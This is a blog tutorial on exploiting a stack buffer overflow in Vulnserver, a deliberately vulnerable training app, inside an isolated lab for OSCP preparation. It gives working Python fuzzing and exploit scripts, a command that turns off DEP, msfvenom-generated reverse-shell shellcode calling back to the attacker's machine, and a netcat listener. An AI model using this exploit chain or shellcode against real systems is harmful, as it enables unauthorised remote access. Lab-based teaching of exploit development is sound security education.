---
title: "Windows Buffer Overflow Guide"
layout: post
categories: Tutorials
---

# Buffer Overflow
<br /><br /><br />
# Prerequisites

## Knowledge

- x86-64 Assembly Language
- Python3 Language (or Python2… minor differences, I will use Python3 beacause it’s new and why use old.)
- Some experience in debugging application
- Some experience in Reverse Engineering
- Also a quick note for true beginners is don’t worry if you dont know much about these prerequsite knowledge since it can all be understood without them and I will probably not go into explaining how the stack works as well as some assembly instructions since it would take waaay too long and complicated. This is just to get you that necessary practical knowledge for OSCP or if you are just curious like me :). One more thing, everyone mostly used Immunity Debugger for debugging but we are in 2022 and no way I will use a tool that dinosaurs used so we use x64dbg :P

## Virtualization

- Virtualization software that I used was Virtualbox, you can use vmware I dont think it matters really but personal preference.

## Operating Systems

- One Linux machine for attacking the vulnerable service (this can be Kali Linux but in my case I am using ParrotOs, just a preference) and one Windows Machine (I was using Windows 10).

## Network

- For network we need to set it up so both machines can communicate between each other and also to not be exposed to internet since obviously exposing a vulnerable service to the whole world would not be good :).
- To do this we are going to need to switch the network settings of the machines to use ‘Host-only Adapter’.

<p align="center">
  <img src="https://i.postimg.cc/g0kqD5nY/Untitled.png">
</p>

## Disabling DEP

- So what is DEP? Well this is basically Data Execution Prevention and it is a protection feature for applications meaning it will make some memory pages to be non executable, which would not execute our shellcode we put on the stack. This is already implemented by default on Windows systems from aroudn 10 years ago but for buffer overflow we need this to be disabled so lets diable it.
- To disable this is very simple, all you have to do is paste this into a command promp (need tu be ran as Administrator).

```powershell
BCDEDIT /SET {CURRENT} NX ALWAYSOFF
```

- This will set the NX (Non-Executable) bit to ‘Always Off’ meaning it will diable it. After that Windows machine needs to be rebooted.

## Tools

- For attacking machine (Kali or Parrot) everything is already included there since both are machines created for PenTest’s as you already know.
- On our Windows 10 machine we need to install ‘x64dbg’ which is a debugger on older tutorials from others you will find everyone using Immunity Debugger but its waaaay to old and why not use new tools :).
- x64dbg needs to installed with ‘mona.py’ which is a python script which will help us later to check protection of dll in use by application as well us find ‘JMP ESP’ gadget addresses and you can do many others things as well.
- Vulnserver, this is our vulnerable service

## Installing Everything

- Vulnserver can be found in the following link and as well as how to use it.
    - https://github.com/stephenbradshaw/vulnserver
    - Vuln server will run on the IP of host and port 9999
- x64dbg that comes with mona.py and correct python version can also be found in the following link. We will be using the x32dbg version since the binary is in 32 bit.
    - https://github.com/therealdreg/x64dbg-exploiting

## Results

- After you are done installing everything you should be ready to go. We can prove that only these two hosts are running in my case my Host-only Adapter was configured to run devices on 192.168.56.0/24 IP Range by pinging them.
    - Attacking Machine → 192.168.56.103
    - Vulnerable Windows Machine → 192.168.56.104
- I used ‘tcpdump’ tool on my Attackign Machine to see the ICMP echoes and replies from Vulnerable Machine to prove that they are communicating which can be seen in the following photo

<p align="center">
  <img src="https://i.postimg.cc/5NstzRd5/Untitled-1.png">
</p>

- One more thing to check if you installed the x64dbg correctly you should be able to navigate to the "Log" tab in debugger right next to the "CPU" tab and check in the console if mona script is loaded. To check you need to set the console to use python in bottom right corner.

<p align="center">
  <img src="https://i.postimg.cc/ZRPb5fxd/Untitled-2.png">
</p>

After that in search box type ‘import mona’, this is also always necessary to do after every time you open the debugger since we will need it.

<p align="center">
  <img src="https://i.postimg.cc/xT82wjhH/Untitled-3.png">
</p>

After pressing ENTER, If nothing comes up you are all set and ready to start exploit :)
<br /><br /><br /><br />

# 1. Spiking

By using this technique we can identify which command inside of application is vulnerable but before that lets just quicly connect to the service and see that it does and get a little familiar with it.

<p align="center">
  <img src="https://i.postimg.cc/G3X2Tmyg/Untitled-4.png">
</p>

Here we can observe that we managed to connect to the service with "ncat" and use some commands that are provided by the application.

Right, so lets begin with spiking.

Before we start spiking we need to open the vulnserver in x32dbg, to do so run the debugger as Admin and after it is oppened we will click the folder icon (top left corener in debugger) to open the application.

<p align="center">
  <img src="https://i.postimg.cc/MpVq56nS/Untitled-5.png">
</p>

After it is oppened in the debugger, press F9 (RUN) to make application run until the status is in Running state, this can be viewed on the bottom of debugger.

<p align="center">
  <img src="https://i.postimg.cc/44HfyQXy/Untitled-6.png">
</p>

You will probably need to press F9 couple of times beacause the x32dbg pauses on System Breakpoints and INT3 entry point breakpoints.

Next to spike the commands in application we will use the "generic_send_tcp" tool on attacking machine, and we spike every command until the application crashes (in debugger the Runing state will change to Paused).

```bash
Usage: generic_send_tcp host port spike_script SKIPVAR SKIPSTR
```

before we execute this command we will need the "spike_script" and this is a simple 3 line script that will be used to fuzz commands.

```bash
# command.spk

s_readline();
s_string("STATS ");
s_string_variable("0");
```

this script will basically just read line and send command "STATS" with no variable so we can fuzz that command.

After this is done save it to a file called command.spk and after that this is how the final execution of "generic_send_tcp" command would look like for me.

```bash
 generic_send_tcp 192.168.56.104 9999 command.spk 0 0
```

SKIPVAR and SKIPSTR are set to 0 beacause we dont want to skip anything and want to make sure we are steadily and precisely spamming the command until the application crashes.

This is how the start of script looks like

<p align="center">
  <img src="https://i.postimg.cc/HW6wWHsd/Untitled-7.png">
</p>

Leave this running for around 1 minute or less, depends on the application how long input can it take.

After spiking for around 1 minute we can see in the debugger that application is still running meaning no buffer overflows are present on this specific command.

Beacause I already exploited this numerous times I know the vulnerable command is "TRUN" so lets spike again but instead of "STATS" command we put "TRUN" command in "command.spk" file.

<p align="center">
  <img src="https://i.postimg.cc/hPxVLm1P/Untitled-8.png">
</p>

After couple of seconds we can see how the applciation crashed (in Paused state). What all this means is that our input is not checked by the amount we can put inside of a "buffer" which is just a variable that stores our input and the function that puts our input into that variable does not check the size of our input which leads to our input overflowing the buffer and overwriting the EIP (instruction pointer) and since we overwrote it in this case our spiking script just puts all "A" characters as a Fuzzing example we will overwrite EIP with all A’s which is 41414141 in hexadecimal little endian format. Once the EIP sees this address which is non existent in appllication it will crash because it can’t go there.

<p align="center">
  <img src="https://i.postimg.cc/cL0tfbJX/Untitled-9.png">
</p>

This can be observed in Registers pane in debugger. We can see how EIP is overwritten with all A’s and EAX show the start of the command sent while ESP (stack pointer) also shows spiking script’s job :) all A’s.

Here is also a great picture I found by googleing to better show you what is a actually happening on the stack once we overflow everything on the stack with A’s.

<p align="center">
  <img src="https://i.postimg.cc/HkvWjZ8J/Untitled-10.png">
</p>

Source: [https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/)  
<br /><br /><br /><br />
# 2. Fuzzing

With fuzzing we are going to try and find the number of bytes it took to crash the application since the spiking part was just to find which function was vulnerable and with fuzzing we are trying to narrow down the amount of bytes to get closer to the EIP to basically redirect programs execution to our code on the stack.

But before that let me show you a quick tip on how you can restart the application without closing the debugger and oppening again vulnserver in it.

All you have to do is press the restart button and F9 again couple of times to start… very simple.

<p align="center">
  <img src="https://i.postimg.cc/6qMgzSXn/Untitled-11.png">
</p>

Okay, to fuzz the application what we are going to do is I will provide and explain the fuzzing script writeen in python and then how to use it.

```python
# fuzz.py

import sys
import socket
from time import sleep

buffer = b"A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.56.104', 9999))

		s.send(b"TRUN /.:/" + buffer)
		s.close()
		sleep(1)
		buffer += b"A" * 100
		
	except:
		print(f"Fuzzing crashed at {str(len(buffer))} bytes")
```

### How it works?

I will not go into hardcore details here since its very simple and basic python I will only explain the socket part. So basically what socket is it creates a connection for you to connect to a service. the “socket.socket(socket.AF_INET, socket.SOCK_STREAM)” part creates IPv4 (socket.AF_INET) and makes it connection-oriented (socket.SOCK_STREAM) which will enable us to connect to the service. After that we use “connect()” function to connect to the service (yes it is indeed in double parenthesis). In our buffer we have “A”*100 which will increment our “A’s” by 100 everytime the crash didn’t happen. One more important thing is “TRUN /.:/” and this is just what was there before A’s while spiking so we leave it and its just vulnerabel command that will be sent with our buffer.

Quick Note: prepended “b” in buffer variable and while using send() func is how python3 works in python2 you don’t need these but python3 handles things differently and you must treat sending this as bytes thats why “b” is for before string.

### How to use?

Well pretty simple change the IP and Port to your vulnerable machine’s respectively. Also super important to do is once you run the fuzzing script make sure you watch the debugger and once the application is crashed instantly stop the script and check at how many bytes it crashed, this is obviously a round number that will overwrite the EIP as well as past it a little bit depends on how fast you stop the script.

We can see the application crashed

<p align="center">
  <img src="https://i.postimg.cc/ZKgDR6Kb/Untitled-12.png">
</p>

And once I stopped the script it says it took 2200 bytes to crash it.

<p align="center">
  <img src="https://i.postimg.cc/63YMNvmN/Untitled-13.png">
</p>

And as well we can see the registers full with A’s and ofcourse EIP overwriten.

<p align="center">
  <img src="https://i.postimg.cc/fT6BZZBk/Untitled-14.png">
</p>
<br /><br /><br /><br />

# 3. Finding Offset

Now this step will focus on finding the exact amount of bytes until we reach EIP beacause we want to overwrite the EIP to point to our injected code.

To do this it is very simple and metasploit script will help us.

We will generate the pattern string using “msf-pattern_create” which will help us find the exact offset using another script called “msf-pattern_offset”.

This is the command to create the patter

```bash
msf-pattern_create -l 2200
```

-l 2200  → this is how much bytes we found by fuzzing and it will generate that length of pattern.

<p align="center">
  <img src="https://i.postimg.cc/rwkZxMW3/Untitled-21.png">
</p>

After this we will crate another python script

```python
# offset.py

import sys
import socket

offset = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('192.168.56.104',9999))
       s.send((b'TRUN /.:/' + offset))
       s.close()

except:
       print("Error connecting to server")
       sys.exit()
```

This time we just replace the buffer with out generated pattern and execute the script.. pretty simple.

Obviously don’t forget to restart the application (I am positive your forgot to do it if you are beginner :).

After executing the script we can see that ofcourse our application crashed and what information now we need is what is in the EIP.

<p align="center">
  <img src="https://i.postimg.cc/63yMt3J2/Untitled-22.png">
</p>

We can see appropriate registers filled with our patter and in EIP there is value: 386F4337

which is hexadecimal number ofcourse and if you convert it to ASCII we get: 8oC7

Yep you guessed it part of our generated pattern. 

Now, to get the offset we use “msf-pattern_offset”

```bash
msf-pattern_offset -l 2200 -q 386F4337
```

we provide the found EIP as -q parameter which will find the right offset until EIP.

<p align="center">
  <img src="https://i.postimg.cc/L82vhvFM/Untitled-23.png">
</p>

we can see the offset is 2003.
<br /><br /><br /><br />

# 4. Overwriting EIP

This step should be short, simply we will check if the offset is correct beacause double checking is always best thing to do.

```python
# overwrite.py

import sys
import socket

shellcode = b"A" * 2003 + b"B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.56.104', 9999))
	s.send(b'TRUN /.:/' + shellcode)
	s.close()

except:
	printf("Could not Connect")
	sys.exit()
```

Here we can see we are sending 2003 bytes of A’s, as mentioned to get to the EIP and then we will send 4 B’s to overwrite the EIP and if we are correct we should see “42424242” (4 B’s) instead of previously seen “41414141” (4 A’s).

After executing the script we get what we expected

<p align="center">
  <img src="https://i.postimg.cc/c1fQYYm1/Untitled-15.png">
</p>

EIP is successfully controlled as expected.
<br /><br /><br /><br />

# 5. Finding Bad Characters

Focus of this section will be to identify bad characters so that they do ******NOT****** get included in the payload afterwards beacause bad characters are characters that are obviosly bad and dont work in the application so our shellcode (payload) will exclude them so we dont need to worry why the shellcode failed after executing.

quick Note: before starting you should know that null bytes “0x00” are always bad and always should be included as bad char.

```python
# badchars.py

import sys
import socket

badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = b"A" * 2003 + b"B" * 4 + badchars

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.56.104', 9999))
	s.send(b"TRUN /.:/" + shellcode)
	s.close()

except:
	print("Could not connect")
	sys.exit()
```

Here in the script we included all possible bytes to be tested in hexadecimal ofcourse which are from 0x01 to 0xFF, also they are seperated in couple of lines for better visibility and as you may expected prepended with “b” to be treated as bytes. After you can see how they are placed behind the EIP on that stack this is so we can better see them in memory.

After executing the script you should see application crashed again and registers should look like this:

<p align="center">
  <img src="https://i.postimg.cc/wvX7t5dS/Untitled-16.png">
</p>

Next we copy the ESP value which is the stack pointer and he points to top of the stack frame curently executed.

We then right click the EIP register and press “Follow in Dump”

<p align="center">
  <img src="https://i.postimg.cc/rwDsG2kG/Untitled-17.png">
</p>

And you should see in debuggers memory dump pane this

<p align="center">
  <img src="https://i.postimg.cc/BbhZDM7w/Untitled-18.png">
</p>

we can see all our bytes possible are placed on the stack where our stack pointer is.

Now this will be a “True eye test” as people refer to it, so you will need to find the bad bytes in here.

For example, the first line of the Hex Dump could read 01 02 03 04 05, if you see a skip within this order, the character it skips is a **bad character**. For example, imagine the first line of the Hex Dump read 01 02 03 **B0** 05, you would now know that 04 is a bad character because it was skipped. You would now annotate 0x04 as a bad character for later.

Its not that complicated just takes a little bit of time to find and you might miss, there are ofcourse tool to this. You can do your research but I am a litle bit agins automation in cyber security but if something would be ultimately tedious then yes but that is besides the point.

This part might seems tedious at first but trust me if you miss one bad bytes your shellcode won’t work and you will spend next several hours trying to find out what doesnt work.

After you checked everything the bad byte in this case is only 0x00 (the null byte) by default ofcourse, the creator of vulnserver was kind looks like :)
<br /><br /><br /><br />

# 6. Finding Correct Module

Now it is time to find the right pointer we need to use to be placed on EIP to redirect the program to our shellcode.

Before we find the correct pointer we need to find the right module inside of the application that constains no restrictions so we can freely use the pointer, this is where previously installed mona python script comes into play.

**Quick Note: Make sure you do not restart the application this time it needs to be in crashed state**

To do this we import mona in Log tab and then issue this comamnd

```bash
mona.mona("modules")
```

and you should see these results

<p align="center">
  <img src="https://i.postimg.cc/dQfz7b5c/Untitled-24.png">
</p>

What we are looking here are the modules imported in the application and what is important to us is to find a right module (it has to be a DLL or application itself (exe)) and it needs to have all security features set to “False”.

In this case essfunc.dll looks like right candidate

```bash
0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (essfunc.dll)
```

Now we need to find the JMP ESP gadget inside of the essfunc.dll module. This is crucial because it represents the pointer value and will be essential for using our Shellcode.

JMP ESP converted to hex is FFE4, that's what you're looking for.

To look for the JMP ESP gadget inside of the previously foudn module we again use mona.

```bash
mona.mona("find -s '\xff\xe4' -m essfunc.dll")
```

**Quick Note: this ‘\xff\xe4’ is programatically represented bytes since python or any language won’t know what 0xff 0xe4 are. its really simple for example 0x01 would be \x01, 0x02 would be \x02 and so on.**

The output looks like this

<p align="center">
  <img src="https://i.postimg.cc/FzvGcxkc/Untitled-25.png">
</p>

Here we can see the column of addresses that contain JMP ESP inside of the essfunc.dll module.

We again look for every security feature to be set to “False” so we avoid protections.

In this case we can see that all results are set to False so theoretically we should be eable to use all though in some cases even tho is set all to False it still might not work so you will have to test these but for vulnserve the first one works.

we will then use this address: “0x625011af”

```python
# jmpesp.py

import sys
import socket

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.56.4', 9999))
	s.send(b"TRUN /.:/" + shellcode)
	s.close()

except:
	print("Couldn't connect to the application")
	sys.exit()
```

In this python script we set the previously set 4 B’s (42424242) to be “\xaf\x11\x50\x62” which is our previously found JMP ESP address but as you noticed it is turned somwhat backwards, again this is little endian format so when it is placed in memory it will look normal, thats why it is kinda backwards. And also set programaticall with “\x[BYTE]” format.

Now to make sure it is going to hit that JMP ESP address we wil set a breakpoint on this address.

To do this its very simple first we navigate to the “CPU” window in debugger and then press CTRL+G which opens a “Go to Expression” window and there we type the address of JMP ESP.

<p align="center">
  <img src="https://i.postimg.cc/GtzPDnCw/Untitled-26.png">
</p>

Press “OK” and you will see the first address in assembly code is our JMP ESP address with corresponding bytes and opcode.

<p align="center">
  <img src="https://i.postimg.cc/xdKzHVvx/Untitled-27.png">
</p>

and to set a breakpoint we click on the dot next to the address and it will turn red like so

<p align="center">
  <img src="https://i.postimg.cc/x1VjmJ6Q/Untitled-28.png">
</p>

Now a breakpoint should be set.

Next we execute the python script which will overwrite the EIP with that address and it should redirect execution to that address and once it lands on it it will stop on it beacause of our breakpoint.

We can see how it landed there by viewing the CPU pane, which will instantly come up with the current instruction being pointed at.

<p align="center">
  <img src="https://i.postimg.cc/nLgnHXjN/Untitled-29.png">
</p>

And also we can see the state of the application which is Paused beacause it hit our breakpoint

<p align="center">
  <img src="https://i.postimg.cc/90t2t18j/Untitled-30.png">
</p>

So now we know that our JMP ESP gadget taken from essfunc.dll module can be used as a jump pointer to the stack pointer where we will inject our shellcode and executing it will give us back shell on the system.

So yep you guessed it next step is Expl0it1ng Th3 Syst3m.

But ofcourse we need to remove that breakpoint otherwise your exploit wont work.

To remove pretty simple just click that red circle again 2 times and you will see it will be removed. Should again look something like this.

<p align="center">
  <img src="https://i.postimg.cc/CLhppGrz/Untitled-31.png">
</p>
<br /><br /><br /><br />

# 7. Exploiting System

The last and best step after we managed to get all possible previous inforamtion and addresses and what not, now we need to generate out shellcode and ensure that we can exploit the system.

Again now you need to restart the debugger with vulnserver running.

To generate the payload we will use “msfvenom” which is used to generate various kinds of shellcodes, that can be Windows, Linux, Android and many more.

To generate the payload we will use this command:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

Its pretty simple but I will still explain commands used:

- -p → used to specify which type of shellcode to use
- LHOST → we set our attacking machine IP since we want the shellcode to connect back to us
- LPORT → set Port on which we want to listen for incomming connection
- EXITFUNC → in this case and mostly all cases we use “thread” as exit function beacause this will run our shellcode as sub-thread and exiting this thread will result into a working application/system which means clean exit.
- -f → with this we specify in which programming language shellcode should be outputted to screen.
- -a → we choose architecture of the system.
- -b → most important one, we set the previously found **********bad bytes********** to avoid shellcode from using it. Do rememebr that if you found more in any otehr application you must include them it is crucial.

This is the output it gives back

<p align="center">
  <img src="https://i.postimg.cc/Y9Hyf7Jh/Untitled-19.png">
</p>

a classic shellcode, if you havent seen one before :)

Right.. Now we need another script which is final one that will exploit the system.

```python
# exploit.py

import sys
import socket

overflow = (b"\xbd\x9d\x0a\xef\xf7\xdb\xdf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
b"\x52\x31\x6e\x12\x03\x6e\x12\x83\x5b\x0e\x0d\x02\x9f\xe7\x53"
b"\xed\x5f\xf8\x33\x67\xba\xc9\x73\x13\xcf\x7a\x44\x57\x9d\x76"
b"\x2f\x35\x35\x0c\x5d\x92\x3a\xa5\xe8\xc4\x75\x36\x40\x34\x14"
b"\xb4\x9b\x69\xf6\x85\x53\x7c\xf7\xc2\x8e\x8d\xa5\x9b\xc5\x20"
b"\x59\xaf\x90\xf8\xd2\xe3\x35\x79\x07\xb3\x34\xa8\x96\xcf\x6e"
b"\x6a\x19\x03\x1b\x23\x01\x40\x26\xfd\xba\xb2\xdc\xfc\x6a\x8b"
b"\x1d\x52\x53\x23\xec\xaa\x94\x84\x0f\xd9\xec\xf6\xb2\xda\x2b"
b"\x84\x68\x6e\xaf\x2e\xfa\xc8\x0b\xce\x2f\x8e\xd8\xdc\x84\xc4"
b"\x86\xc0\x1b\x08\xbd\xfd\x90\xaf\x11\x74\xe2\x8b\xb5\xdc\xb0"
b"\xb2\xec\xb8\x17\xca\xee\x62\xc7\x6e\x65\x8e\x1c\x03\x24\xc7"
b"\xd1\x2e\xd6\x17\x7e\x38\xa5\x25\x21\x92\x21\x06\xaa\x3c\xb6"
b"\x69\x81\xf9\x28\x94\x2a\xfa\x61\x53\x7e\xaa\x19\x72\xff\x21"
b"\xd9\x7b\x2a\xe5\x89\xd3\x85\x46\x79\x94\x75\x2f\x93\x1b\xa9"
b"\x4f\x9c\xf1\xc2\xfa\x67\x92\x2c\x52\x5f\x05\xc5\xa1\x9f\xd8"
b"\x49\x2f\x79\xb0\x61\x79\xd2\x2d\x1b\x20\xa8\xcc\xe4\xfe\xd5"
b"\xcf\x6f\x0d\x2a\x81\x87\x78\x38\x76\x68\x37\x62\xd1\x77\xed"
b"\x0a\xbd\xea\x6a\xca\xc8\x16\x25\x9d\x9d\xe9\x3c\x4b\x30\x53"
b"\x97\x69\xc9\x05\xd0\x29\x16\xf6\xdf\xb0\xdb\x42\xc4\xa2\x25"
b"\x4a\x40\x96\xf9\x1d\x1e\x40\xbc\xf7\xd0\x3a\x16\xab\xba\xaa"
b"\xef\x87\x7c\xac\xef\xcd\x0a\x50\x41\xb8\x4a\x6f\x6e\x2c\x5b"
b"\x08\x92\xcc\xa4\xc3\x16\xec\x46\xc1\x62\x85\xde\x80\xce\xc8"
b"\xe0\x7f\x0c\xf5\x62\x75\xed\x02\x7a\xfc\xe8\x4f\x3c\xed\x80"
b"\xc0\xa9\x11\x36\xe0\xfb")

shellcode = b"A"*2003 + b"\xaf\x11\x50\x62" + b"\x90"*16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.56.104', 9999))
	s.send(b"TRUN /.:/" + shellcode)
	s.close()

except:
	print("Cant connect")
	sys.exit()
```

Script like those ones before but this time you can see how after our JMP ESP pointer address that is placed on Return address we have 0x90 bytes (16 of them), basically what 0x90 does in assembly is it literally ******************does nothing******************, it is also refred to as NOP byte (No Operation) and when programs execution flow hits this part it will just do nothing until it gets to our shellcode we put after the NOP bytes. This is to prevent from execution flow to not get some of the first bytes of our shellcode not includede which will result to exploit not working (These NOP’s are also referred to as NOP sled). Also again aeverything is prepended with “b” to treat it as Bytes like mentioned before.

************Quick Note: NOP’s can be 32, 16 or 8 bytes long. Depends on how much you put but I always go with 16.************

Before running our exploit we need to set up a listener to listen for incomming connections, if you are also hardcore or seasoned hackerman you are well aware of this command:

```bash
nc -lvnp 4444
```

Now run the exploit and BOOM here we have a shell on the system.

<p align="center">
  <img src="https://i.postimg.cc/ZYfV06K9/Untitled-20.png">
</p>


As you can see we can also run the commands as expected. Now you understand how to make basic buffer overflow for windows applications.

************************************************Quick Note: you might need to rerun the exploit couple of times or it may take a couple of seconds for your listener to catch the shell.************************************************
<br /><br /><br /><br />

## Real World?

This is written in 2022 and by the time you are doing this you are most likely going for OSCP cert which is good, but not a chance you will find this in real world anymore beacause no one pretty much write that much of a bad code and most compilers already give a warning if you write your code insecurely. Also by default every program nowdays has security protections enabled like NX bit set which makes stack non sexecutable, and you guessed it it won’t execute our shellcode even if the programmer wrote the application very poorly security wise.

## Thanks!

Thank you very much for taking your time to read this or even follow along. Remember you are amazing and everything is achievable. Keep doing everything little by little and you will succeed, I promise!

## Always accepting help!

Also, I gave my best but I am still nowhere near writing properly so If something is not quite understandable or something needs to be written better, make sure to contact me and I will try to fix the blog post the best I can.

